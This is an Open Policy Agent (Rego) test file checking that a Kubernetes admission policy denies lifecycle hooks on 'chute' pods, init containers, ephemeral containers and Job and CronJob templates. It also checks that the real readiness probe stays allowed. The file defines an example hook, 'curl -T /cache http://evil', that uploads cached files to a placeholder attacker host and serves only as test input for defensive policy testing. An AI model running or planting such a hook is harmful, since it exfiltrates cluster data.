# Chute pods may not set lifecycle hooks: arbitrary argv that bypasses the command rules and runs
# even when the entrypoint aborts.
package kubernetes.admission

import future.keywords.if
import future.keywords.in

exec_hook := {"exec": {"command": ["/bin/sh", "-c", "curl -T /cache http://evil"]}}

# The legitimate readiness probe the real chute spec ships (chutes-miner api/k8s/util.py).
alive_probe := {"exec": {"command": ["/bin/sh", "-c", "curl -f http://127.0.0.1:8000/_alive || exit 1"]}}

chute_container(extra) := object.union(
	{
		"name": "chute",
		"image": "registry.chutes.ai/org/chute:latest",
		"command": ["chutes", "run", "x"],
	},
	extra,
)

cache_init(extra) := object.union(
	{
		"name": "cache-init",
		"image": "parachutes/cache-cleaner:latest",
		"securityContext": {"runAsUser": 0},
	},
	extra,
)

pod(spec) := {
	"operation": "CREATE",
	"namespace": "chutes",
	"kind": {"kind": "Pod"},
	"userInfo": {"username": "system:serviceaccount:chutes:miner"},
	"object": {
		"metadata": {"labels": {"chutes/chute": "true"}},
		"spec": object.union({"securityContext": {"runAsUser": 1000}}, spec),
	},
}

lifecycle_denied(name) := sprintf(
	"Chutes namespace: container '%s' must not set lifecycle hooks (postStart/preStop); only the image entrypoint may execute",
	[name],
)

# --- the regression -------------------------------------------------------------

test_deny_post_start_on_chute_container if {
	req := pod({"containers": [chute_container({"lifecycle": {"postStart": exec_hook}})]})
	deny[lifecycle_denied("chute")] with input as {"request": req}
}

test_deny_pre_stop_on_chute_container if {
	req := pod({"containers": [chute_container({"lifecycle": {"preStop": exec_hook}})]})
	deny[lifecycle_denied("chute")] with input as {"request": req}
}

# The root carve-out was granted assuming only cache-cleaner's own entrypoint runs.
test_deny_post_start_on_root_cache_init if {
	req := pod({
		"containers": [chute_container({})],
		"initContainers": [cache_init({"lifecycle": {"postStart": exec_hook}})],
	})
	deny[lifecycle_denied("cache-init")] with input as {"request": req}
}

test_deny_lifecycle_on_ephemeral_container if {
	req := pod({
		"containers": [chute_container({})],
		"ephemeralContainers": [{"name": "debug", "image": "registry.chutes.ai/org/chute:latest", "lifecycle": {"postStart": exec_hook}}],
	})
	deny[lifecycle_denied("debug")] with input as {"request": req}
}

# Any hook type, not just exec — httpGet reaches the network from inside the pod.
test_deny_non_exec_hook_types if {
	req := pod({"containers": [chute_container({"lifecycle": {"postStart": {"httpGet": {"path": "/x", "port": 80}}}})]})
	deny[lifecycle_denied("chute")] with input as {"request": req}
}

test_deny_lifecycle_in_job_template if {
	req := {
		"operation": "CREATE",
		"namespace": "chutes",
		"kind": {"kind": "Job"},
		"userInfo": {"username": "system:serviceaccount:chutes:miner"},
		"object": {"spec": {"template": {
			"metadata": {"labels": {"chutes/chute": "true"}},
			"spec": {
				"securityContext": {"runAsUser": 1000},
				"containers": [chute_container({"lifecycle": {"postStart": exec_hook}})],
			},
		}}},
	}
	deny[lifecycle_denied("chute")] with input as {"request": req}
}

test_deny_lifecycle_in_cronjob_template if {
	req := {
		"operation": "CREATE",
		"namespace": "chutes",
		"kind": {"kind": "CronJob"},
		"userInfo": {"username": "system:serviceaccount:chutes:miner"},
		"object": {"spec": {"jobTemplate": {"spec": {"template": {
			"metadata": {"labels": {"chutes/chute": "true"}},
			"spec": {
				"securityContext": {"runAsUser": 1000},
				"containers": [chute_container({"lifecycle": {"postStart": exec_hook}})],
			},
		}}}}},
	}
	deny[lifecycle_denied("chute")] with input as {"request": req}
}

# --- the real spec must keep working --------------------------------------------

test_allow_real_chute_spec_without_lifecycle if {
	req := pod({
		"containers": [chute_container({
			"securityContext": {"capabilities": {"add": ["IPC_LOCK"]}},
			"readinessProbe": alive_probe,
		})],
		"initContainers": [cache_init({})],
	})
	count({m | deny[m]; contains(m, "lifecycle")}) == 0 with input as {"request": req}
}

# Probe exec is deliberately out of scope: the production spec depends on it. This test
# documents that, so a future change to block probe exec has to confront it explicitly.
test_exec_readiness_probe_is_not_blocked_by_the_lifecycle_rule if {
	req := pod({"containers": [chute_container({"readinessProbe": alive_probe})]})
	count({m | deny[m]; contains(m, "lifecycle")}) == 0 with input as {"request": req}
}
